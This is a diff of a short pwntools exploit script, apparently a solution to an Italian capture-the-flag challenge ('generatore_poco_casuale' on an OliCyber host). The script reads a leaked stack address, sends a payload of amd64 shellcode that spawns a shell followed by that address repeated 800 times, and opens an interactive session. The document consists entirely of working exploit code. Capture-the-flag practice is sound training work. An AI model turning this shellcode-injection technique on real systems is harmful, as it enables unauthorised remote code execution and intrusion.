@@ -1,22 +1,20 @@
 from pwn import *
 
-p = gdb.debug("./generatore_poco_casuale", gdbscript="""
-    b *randomGenerator+149
-""")
+if args.REMOTE:
+    r = remote("gpc.challs.olicyber.it", 10104)
+else:
+    r = gdb.debug('./generatore_poco_casuale', '''
+                        b *randomGenerator+149  
+                        c
+                  ''')
 
-# p = remote("gpc.challs.olicyber.it", 10104)
+r.recvuntil(b'Ecco il numero casuale: ')
+leak = int(r.recvline().strip().decode()) + 6
+print(f"shellcode_address: {hex(leak)}")
 
-p.recvuntil(b": ")
-addr = int(p.recvline().decode().strip())
-p.recvuntil(b"(s/n)")
+r.recvuntil(b'Desideri continuare? (s/n)')
 
-nop_sled  = b"\x90" * 31
-shellcode = asm(shellcraft.amd64.linux.sh(), arch='x86_64')
-
-payload  = b"s"
-payload += nop_sled
-payload += shellcode
-payload += p64(addr + 1) * 800
-
-p.sendline(payload)
-p.interactive()
+payload = b's' + b'\x00'*7 + asm(shellcraft.amd64.linux.sh(), arch='x86_64')
+payload += p64(leak)*800
+r.sendline(payload)
+r.interactive()
